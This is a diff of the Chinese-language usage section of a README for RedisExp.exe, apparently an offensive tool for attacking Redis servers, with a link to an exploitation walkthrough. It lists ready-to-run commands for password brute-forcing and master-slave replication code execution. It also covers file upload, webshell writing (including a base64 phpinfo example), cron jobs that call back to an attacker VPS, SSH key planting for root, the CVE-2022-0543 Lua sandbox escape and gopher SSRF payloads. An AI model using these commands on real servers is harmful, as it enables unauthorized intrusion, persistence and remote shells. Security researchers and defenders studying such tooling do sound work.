@@ -13,6 +13,10 @@
 
 ------
 
+图文利用过程：[https://yuyan-sec.github.io/posts/redisexp/](https://yuyan-sec.github.io/posts/redisexp/)
+
+
+
 
 ```
 
@@ -26,48 +30,35 @@
 基本连接: 
 RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456
 
-爆破 Redis 密码:
-RedisExp.exe brute -r 目标IP -p 目标端口 -f 字典文件
-RedisExp.exe brute -r 192.168.19.1 -f pass.txt
+主从复制命令执行：
+RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
 
-主从复制执行命令 (默认是交互式 shell)(Redis版本 4.x - 5.x):
-RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行]
-RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -c whoami (单次执行)
-RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1
-RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -f exp.so (Linux)
+主从复制上传文件：
+RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件
 
-主从复制文件上传 (windows 中文需要设置gbk)(Redis版本 4.x - 5.x):
-RedisExp.exe -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -d 目标路径 -f 目标文件名 -F 本地文件
-RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -d c:\\中文\\ -f shell.php -F shell.txt -g
-RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -f shell.php -F shell.txt
+主动关闭主从复制：
+RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码
 
-关闭主从复制
-RedisExp.exe close -r 192.168.19.1
+写计划任务：
+RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
 
-Lua沙盒绕过命令执行 CVE-2022-0543:
-RedisExp.exe lua -r 192.168.19.6 -c whoami
+写SSH 公钥：
+RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥
 
-备份写 Webshell: 
-1. Windows 中文路径要设置gbk, linux 中文路径不用设置。
-2. webshell的内容是base64，使用 -b 参数来解码。工具默认会关闭Redis压缩进行写入，写入后再恢复。
+写webshell：
+RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]
 
-RedisExp.exe shell -r 目标IP -p 目标端口 -w 密码 -d 目标路径 -f 目标文件名 -s Webshell内容
-RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "<?php phpinfo();?>" -g
-RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "PD9waHAgcGhwaW5mbygpOz8+" -g -b
+CVE-2022-0543：
+RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令
 
-Linux 写计划任务:
-RedisExp.exe cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort
-RedisExp.exe cron -r 192.168.19.1 -L 127.0.0.1 -P 2222
+爆破Redis密码：
+RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典
 
-Linux 写 SSH 公钥:
-RedisExp.exe ssh -r 目标IP -p 目标端口 -w 密码 -n 用户名 -s 公钥
-RedisExp.exe ssh -r 192.168.19.1 -u root -s "ssh-rsa AAAAB"
+生成gohper：
+RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件
 
-执行 Redis 命令:
-RedisExp.exe cli -r 192.168.19.1
-
-生成 gopher ssrf redis payload: 
-RedisExp.exe gopher -f 1.txt
+执行 bgsave：
+RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码
 
 ```
 
